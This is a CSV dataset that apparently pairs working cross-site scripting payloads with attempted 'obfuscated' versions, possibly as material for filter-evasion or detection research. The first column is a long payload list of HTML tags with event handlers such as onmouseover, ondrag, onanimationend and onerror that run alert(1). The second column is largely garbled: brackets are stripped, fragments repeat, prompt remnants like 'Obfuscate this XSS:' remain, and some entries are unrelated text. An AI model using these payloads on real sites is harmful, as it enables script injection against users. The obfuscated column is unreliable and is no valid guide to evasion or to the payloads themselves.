original,ofuscado
"<summary onmousemove=""alert(1)"">test</summary>",": summary onmousemove=""alert(1)"">test/summary>"
"<strike onkeyup=""alert(1)"" contenteditable>test</strike>",if the other tests are possible.
"<del onclick=""alert(1)"">test</del>",>test/del>
"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>","XSS: div draggable=""true"" contenteditable>drag me/div>isindex ondragover=alert(1) contenteditable>drop here/isindex>"
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>","basefont onbeforepaste=""alert(1)"" contenteditable>test/basefont>"
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationend=""alert(1)""></col>","this XSS: style>@keyframes x/style>col style=""animation-name:x"" onanimationend=""alert(1)"">/col>/col>/col style=""animation-name:x"" onanimationend=""alert(1)"">/col>/col>."
"<meta onmousedown=""alert(1)"">test</meta>","This XSS: meta onmousedown=""alert(1)"">test/meta>"
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" ontransitionend=alert(1)></label>","style>:target color:red;/style>label id=x style=""transition:color 1s"" ontransitionend=alert(1)>/label>"
"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>","XSS: div draggable=""true"" contenteditable>drag me/div>li ondrop=alert(1) contenteditable>drop here/li>"
"<strong draggable=""true"" ondragenter=""alert(1)"">test</strong>","XSS : strong draggable=""true"" ondragenter=""alert(1)"">test/strong>"
"<ul oncopy=""alert(1)"" contenteditable>test</ul>","Obfuscate this XSS: ul oncopy=""alert(1)"" contenteditable>test/ul>"
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationstart=""alert(1)""></samp>","=""animation-name:x"" onanimationstart=""alert(1)"">/samp>/samp>/samp style=""animation-name:x"" onanimationstart=""alert(1)"">/samp>/samp>/samp>>/samp>/samp>>/samp>/samp>"
<code onpointerover=alert(1)>xss</code>,Obfuscate this XSS: code onpointerover=alert(1)>xss/code> XSS: code onpointerover=alert(1)>xss/code>
"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",ectopic>test/del>
"<u oncut=""alert(1)"" contenteditable>test</u>","Obfuscate this XSS: u oncut=""alert(1)"" contenteditable>test/u>"
<td onpointerdown=alert(1)>xss</td>,d=alert(1)>xss/td>.
<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>,/font>input autofocus>=
"<style>@keyframes slidein {}</style><ol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ol>",":=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/ol>/ol>/ol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/ol>/ol>/ol>/"
"<thead draggable=""true"" ondrag=""alert(1)"">test</thead>",": thead draggable=""true"" ondrag=""alert(1)"">test/thead>"
"<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",":: sub draggable=""true"" ondragstart=""alert(1)"">test/sub>"
"<dl onmouseover=""alert(1)"">test</dl>","with this, so you would have to check the results!"
"<bdi onmouseup=""alert(1)"">test</bdi>",": bdi onmouseup=""alert(1)"">test/bdi>"
<textarea oninput=alert(1)>xss</textarea>,xs a> xss/textarea>.
"<samp onmouseover=""alert(1)"">test</samp>",": samp onmouseover=""alert(1)"">test/samp>>test/samp>"
"<dialog onkeydown=""alert(1)"" contenteditable>test</dialog>",": dialog onkeydown=""alert(1)"" contenteditable>test/dialog>"
<frameset onpointerout=alert(1)>xss</frameset>,: frameset onpointerout=alert(1)>xss/frameset>
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>",">/slot style=""animation-name:x"" onanimationstart=""alert(1)"">/slot>/slot> XSS: style>@keyframes x/style>slot style=""animation-name:x"" onanimationstart=""alert(1)"">/slot>"
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>","in a XSS: applet onkeypress=""alert(1)"" contenteditable>test/applet>"
<svg><nav onload=alert(1)></nav>,XSS: svg>nav onload=alert(1)>/nav>
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>","this XSS: basefont onpaste=""alert(1)"" contenteditable>test/basefont>"
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></object>","/style>:target color: red;/style>object id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/object>"
"<element oncontextmenu=""alert(1)"">test</element>","as>test/element> XSS: element oncontextmenu=""alert(1)"">test/element>"
"<rp onclick=""alert(1)"">test</rp>",": rp onclick=""alert(1)"">test/rp>"
<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>,XSS: figcaption id=x tabindex=1 onactivate=alert(1)>/figcaption>
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>","Obfuscate thisXSS: bdo oncut=""alert(1)"" contenteditable>test/bdo>"
<th onpointerleave=alert(1)>xss</th>,/th>o this XSS: th onpointerleave=alert(1)>xss/th>> this XSS: th onpointerleave=alert(1)>xss/th>i>:
"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",":u ondrop=alert(1) contenteditable>drop here/u>es>>drop here/u> this XSS: div draggable=""true"" contenteditable>drag me/div>u ondrop=alert(1) contenteditable>drop here/u>"
"<basefont onmousemove=""alert(1)"">test</basefont>",": basefont onmousemove=""alert(1)"">test/basefont>"
"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>","the file ""txt"" ondragover=alert(1) contenteditable>drop here/rt>"
"<data onkeyup=""alert(1)"" contenteditable>test</data>","data data onkeyup=""alert(1)"" contenteditable>test/data>"
"<sub onmouseenter=""alert(1)"">test</sub>",": sub onmouseenter=""alert(1)"">test/sub>"
<svg><noframes onload=alert(1)></noframes>,-::svg>noframes onload=alert(1)>/noframes>
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>","div draggable=""true"" contenteditable>drag me/div>span ondragover=alert(1) contenteditable>drop here/span>"
"<style>:target {color: red;}</style><style id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></style>","/style>style id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/style>"
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>","id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/h1>"
<ul onpointerleave=alert(1)>xss</ul>,: ul onpointerleave=alert(1)>xss/ul>xss/ul>
<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>,/article>input autofocus>.
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",": div draggable=""true"" contenteditable>drag me/div>h1 ondragover=alert(1) contenteditable>drop here/h1>"
<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>,=5 at a time and need to do it in a manner that will enable more energy delivery.
<svg><source onload=alert(1)></source>,XSS:=alert(1)/source> this XSS:source onload=alert(1)>/source>
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationstart=""alert(1)""></thead>","o: style>@keyframes x/style>thead style=""animation-name:x"" onanimationstart=""alert(1)"">/thead>"
"<map onkeyup=""alert(1)"" contenteditable>test</map>",t/map>>
"b=""url(\"""";","Obfuscate this XSS: b=""url("";"
"<tr draggable=""true"" ondragstart=""alert(1)"">test</tr>",": tr draggable=""true"" ondragstart=""alert(1)"">test/tr>"
"<listing onmouseout=""alert(1)"">test</listing>",": listing onmouseout=""alert(1)"">test/listing>"
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>","XSS – style>:target color:red;/style>var id=x style=""transition:color 1s"" ontransitionend=alert(1)>/var>"
<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>,= x>/spacer>input autofocus>
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>","abbr onkeydown=""alert(1)"" contenteditable>test/abbr>"
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",": b onbeforepaste=""alert(1)"" contenteditable>test/b>"
"<sub onbeforecopy=""alert(1)"" contenteditable>test</sub>",> contenteditable>test/sub>
<dd id=x tabindex=1 onactivate=alert(1)></dd>,this: dd id=x tabindex=1 onactivate=alert(1)>/dd>
<optgroup onpointerenter=alert(1)>xss</optgroup>,: optgroup onpointerenter=alert(1)>xss/optgroup>.
"<i draggable=""true"" ondragstart=""alert(1)"">test</i>",": i draggable=""true"" ondragstart=""alert(1)"">test/i>"
"<samp onmouseleave=""alert(1)"">test</samp>",": samp onmouseleave=""alert(1)"">test/samp>"
<header onpointerout=alert(1)>xss</header>,s this: header onpointerout=alert(1)>xss/header>?
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>","()"" contenteditable>test/iframe>"
"<font onclick=""alert(1)"">test</font>","XSS: font onclick=""alert(1)"">test/font>"
<video onpointerenter=alert(1)>xss</video>,l: video onpointerenter=alert(1)>xss/video>=> this XSS: video onpointerenter=alert(1)>xss/video>
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,: aside id=x tabindex=1 onfocusin=alert(1)>/aside>
"<link onkeypress=""alert(1)"" contenteditable>test</link>",? ?
"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></fieldset>","=""transition:color 10s"" ontransitioncancel=alert(1)>/fieldset>"
"<ol draggable=""true"" ondragleave=""alert(1)"">test</ol>",": ol draggable=""true"" ondragleave=""alert(1)"">test/ol>"
"<time onkeydown=""alert(1)"" contenteditable>test</time>","se-alert(1)"" contenteditable>test/time>"
"<spacer onbeforepaste=""alert(1)"" contenteditable>test</spacer>",": spacer onbeforepaste=""alert(1)"" contenteditable>test/spacer>"
"<figure oncontextmenu=""alert(1)"">test</figure>",": figure oncontextmenu=""alert(1)"">test/figure>"
"<map draggable=""true"" ondragend=""alert(1)"">test</map>","map draggable=""true"" ondragend=""alert(1)"">test/map>"
"<col onbeforecut=""alert(1)"" contenteditable>test</col>","()) col onbeforecut=""alert(1)"" contenteditable>test/col>"
"<figcaption onkeypress=""alert(1)"" contenteditable>test</figcaption>",": figcaption onkeypress=""alert(1)"" contenteditable>test/figcaption>"
<section onpointerdown=alert(1)>xss</section>,and then re-order it.
"<iframe onbeforecut=""alert(1)"" contenteditable>test</iframe>",": iframe onbeforecut=""alert(1)"" contenteditable>test/iframe>spread XSS: iframe onbeforecut=""alert(1)"" contenteditable>test/iframe>spread to:"
"<html draggable=""true"" ondragstart=""alert(1)"">test</html>","t/html> XSS: html draggable=""true"" ondragstart=""alert(1)"">test/html>"
<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>,/dl>input autofocus> (dl onfocusout=alert(1) tabindex=1 id=x>).
<style onpointerover=alert(1)>xss</style>,: style onpointerover=alert(1)>xss/style>; style onpointerover=alert(1)>xss/style>
"<form onmouseenter=""alert(1)"">test</form>","this XSS: form onmouseenter=""alert(1)"">test/form>"
"<isindex onmouseup=""alert(1)"">test</isindex>","XSS: isindex onmouseup=""alert(1)"">test/isindex>"
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>","! ! #/style>nobr style=""animation-name:x"" onanimationend=""alert(1)"">/nobr>"
<tfoot onpointermove=alert(1)>xss</tfoot>,: tfoot onpointermove=alert(1)>xss/tfoot>
<input3 onpointerenter=alert(1)>xss</input3>,XSS: input3 onpointerenter=alert(1)>xss/input3>
<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>,button id=x tabindex=1 onbeforedeactivate=alert(1)>/button>input autofocus>
"<svg onclick=""alert(1)"">test</svg>","-cash XSS: svg onclick=""alert(1)"">test/svg>"
"<menuitem onmouseleave=""alert(1)"">test</menuitem>","nuitem onmouseleave=""alert(1)"">test/menuitem>"
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>","the XSS: a onbeforecopy=""alert(1)"" contenteditable>test/a>."
"<xmp oncontextmenu=""alert(1)"">test</xmp>",">: xmp oncontextmenu=""alert(1)"">test/xmp>"
<del onpointerdown=alert(1)>xss</del>,this XSS: del onpointerdown=alert(1)>xss/del>
<em onpointerout=alert(1)>xss</em>,nt XSS: em onpointerout=alert(1)>xss/em>.
"<ruby onkeyup=""alert(1)"" contenteditable>test</ruby>","? ruby onkeyup=""alert(1)"" contenteditable>test/ruby>"
<summary onpointerenter=alert(1)>xss</summary>,this XSS: summary onpointerenter=alert(1)>xss/summary>
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationend=""alert(1)""></isindex>","tut this XSS:>@keyframes x/style>isindex style=""animation-name:x"" onanimationend=""alert(1)"">/isindex>/isindex>"
<img src/onerror=alert(1)>,src/onerror=alert(1)>
"<col onkeypress=""alert(1)"" contenteditable>test</col>",">test/col>: col onkeypress=""alert(1)"" contenteditable>test/col>"
"<html onbeforecopy=""alert(1)"" contenteditable>test</html>",":html onbeforecopy=""alert(1)"" contenteditable>test/html>"
"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>",": div draggable=""true"" contenteditable>drag me/div>shadow ondrop=alert(1) contenteditable>drop here/shadow>"
"<base oncut=""alert(1)"" contenteditable>test</base>","Obfuscate thisXSS: base oncut=""alert(1)"" contenteditable>test/base>"
<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>,>/menuitem>input autofocus>
"<dt onmousedown=""alert(1)"">test</dt>","(dt onmousedown=""alert(1)"">test/dt>"
"<picture onkeypress=""alert(1)"" contenteditable>test</picture>",":"" contenteditable>test/picture>"
<nav onpointerenter=alert(1)>xss</nav>,: nav onpointerenter=alert(1)>xss/nav>
<datalist onpointerup=alert(1)>xss</datalist>,: datalist onpointerup=alert(1)>xss/datalist>.
"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>","XSS: aside draggable=""true"" ondragend=""alert(1)"">test/aside>"
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>","/style>bdi style=""animation-name:x"" onanimationstart=""alert(1)"">/bdi>"
<svg><multicol onload=alert(1)></multicol>,for the XSS: svg>multicol onload=alert(1)>/multicol>
<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>,: noembed id=x tabindex=1 onfocusin=alert(1)>/noembed>
<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>,: menu id=x tabindex=1 onbeforedeactivate=alert(1)>/menu>input autofocus>
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>,:lc=sclt=mr=x tabindex=1 ondeactivate=alert(1)>/nobr>input id=y autofocus>
<nextid id=x tabindex=1 onfocus=alert(1)></nextid>,: nextid id=x tabindex=1 onfocus=alert(1)>/nextid>
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>","=""alert(1)"" contenteditable>test/picture>"
"<big onclick=""alert(1)"">test</big>","=""alert(1)"">test/big>"
"<s draggable=""true"" ondrag=""alert(1)"">test</s>","Obfuscate this XSS: s draggable=""true"" ondrag=""alert(1)"">test"
"<plaintext onmouseover=""alert(1)"">test</plaintext>",": plaintext onmouseover=""alert(1)"">test/plaintext>"
"<thead draggable=""true"" ondragleave=""alert(1)"">test</thead>",": thead draggable=""true"" ondragleave=""alert(1)"">test/thead>"
"<bdo onmouseout=""alert(1)"">test</bdo>","in XSS: bdo onmouseout=""alert(1)"">test/bdo>"
<isindex onpointerleave=alert(1)>xss</isindex>,/isindex> Oblicate this XSS: isindex onpointerleave=alert(1)>xss/isindex>.
"<progress onmouseleave=""alert(1)"">test</progress>",": progress onmouseleave=""alert(1)"">test/progress>"
"<tbody onpaste=""alert(1)"" contenteditable>test</tbody>",>test/tbody>
"<ruby onmousedown=""alert(1)"">test</ruby>",": ruby onmousedown=""alert(1)"">test/ruby>"
"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>",": div draggable=""true"" contenteditable>drag me/div>picture ondragover=alert(1) contenteditable>drop here/picture>"
"<picture onkeydown=""alert(1)"" contenteditable>test</picture>","(cashboard) and picture onkeydown=""alert(1)"" contenteditable>test/picture>"
"<style>:target {color: red;}</style><map id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></map>","style>:target color: red;/style>map id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/map>"
<header onpointerdown=alert(1)>xss</header>,XSS: header onpointerdown=alert(1)>xss/header>
<dir onpointerenter=alert(1)>xss</dir>,: dir onpointerenter=alert(1)>xss/dir>.
<svg><dt onload=alert(1)></dt>,XSS: svg>dt onload=alert(1)>/dt>
"<span ondblclick=""alert(1)"">test</span>",>test/span>
"<blink onmouseover=""alert(1)"">test</blink>","onmouseover=""alert(1)"">test/blink>"
"<button draggable=""true"" ondrag=""alert(1)"">test</button>","xSS: button draggable=""true"" ondrag=""alert(1)"">test/button>"
